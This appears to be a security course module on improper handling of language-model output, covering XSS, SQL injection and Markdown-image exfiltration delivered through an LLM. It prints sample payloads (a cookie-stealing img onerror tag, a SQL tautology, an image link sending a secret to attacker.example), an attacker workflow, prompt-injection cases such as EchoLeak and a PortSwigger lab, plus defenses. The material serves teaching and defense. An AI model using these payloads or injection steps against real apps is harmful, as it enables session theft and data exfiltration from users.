Improper output handling

When an app trusts what the model writes, old web bugs come back. XSS, SQL injection and command injection, delivered by an LLM.

The idea in one minute

Developers learned long ago never to trust user input. Many still trust model output. But model output is shaped by user input, and by any document the model read. So model output is user input with one more step.

If the app puts model output into a web page, a SQL query, a shell command or a URL without checks, an attacker who steers the model can run code in those places.

Think of it like this

You would not let a stranger write directly on your shop's price board. If you let a parrot write on it, and the stranger can teach the parrot words, the stranger is still writing on your board.

Words you need

XSS
Cross-site scripting. The attacker's script runs in another user's browser.
SQL injection
Text that changes the meaning of a database query.
Output encoding
Turning special characters into safe forms for the place they go, such as < becoming &lt; in HTML.
Sanitizing
Removing dangerous parts of HTML while keeping safe formatting. DOMPurify is a common library for this.
CSP
Content Security Policy. A browser rule that limits which scripts, images and links a page may load.
Markdown image exfiltration
The model writes an image link with private data in the URL. The browser loads it and sends the data to the attacker's server.

How it works, step by step

One payload, three destinations

Module 11 shows a work-order system. One injected request makes the model write a summary with <img src=x onerror="send(document.cookie)"> and a district value of North 3' OR '1'='1.

  1. On the requester's own page, the script runs in the attacker's own browser. Little harm.
  2. On the dispatcher's console, the script runs later in a staff browser and steals that session. High harm. This is stored XSS.
  3. In the district lookup, the text joins a SQL query and matches every row. SQL injection.

The danger depends on where the output lands and who sees it there. The fixes are old web defenses, applied to a new source of text.

Data theft through links and images

Chat apps render Markdown. An injected instruction makes the model write ![chart](https://attacker.example/?d=SECRET). The browser loads the image and sends the secret. The user clicks nothing. EchoLeak used this pattern.

The attack, as a workflow

  1. Find where the model's output is shown or used. Look at web pages, admin consoles, logs, databases and tool calls.
  2. Get your text into the model's input, directly or through content it reads.
  3. Make the model repeat a payload made for that destination, such as an HTML tag, a SQL fragment or a Markdown image.
  4. Wait for the output to land where it runs, often in another user's session.

Real cases

EchoLeak, 2025

Copilot wrote private data into a link that loaded on its own. The data left through the output channel, not through a tool.

PortSwigger lab

A product review hides an HTML payload. When the LLM chat repeats the review to another user, the payload runs in that user's browser.

How to defend

  • Treat the model as an untrusted user. Apply zero trust to everything it writes.
  • Encode for the destination. HTML encode text that goes into a page. Use parameterized queries for SQL. Never pass model output to eval, exec or a shell.
  • Sanitize rich output. If you render Markdown or HTML, run it through a sanitizer such as DOMPurify with a strict allow list of tags.
  • Block outside resources. Do not auto-load images or links from domains you do not trust. Set a strict CSP.
  • Validate structure. If you expect one of 12 district names, accept only those 12.
  • Log outputs, so you can find what an attack touched.
  1. Draw every place model output goes.
  2. Name the right control for each place, using the list above.
  3. Put the control in code after the model, not in the prompt.
  4. Test each place with a known payload, such as a harmless alert script.

Step by step

  1. Solve LLMGoat A05 and save the prompt.
  2. Open the PortSwigger lab. Read the goal. You must make another user's browser run your code.
  3. Ask the live chat about products. See which product text it repeats.
  4. Test whether the chat output is HTML encoded. Try a harmless tag in a message to the chat.
  5. Find a place where text that another user will see reaches the chat, such as a product review.
  6. Plant a payload there that does the lab's goal when the chat repeats it to the other user.
  7. Extend task. Solve one more PortSwigger Web LLM lab of your choice.

Readings, explained

  • OWASP LLM05 2025. Improper output handling must read standard
    The official entry. Lists examples such as XSS, SQL injection and RCE, and mitigations such as zero trust on output, encoding and parameterized queries.
  • Auth0. OWASP LLM05 improper output handling article
    Explains why LLM output handling is the new XSS, with clear examples.
  • SHIELDA. Structured handling of exceptions in LLM-driven agentic workflows paper
    Looks at errors and exceptions in agent workflows and gives structured ways to handle them, such as retry, roll back and send to a person.
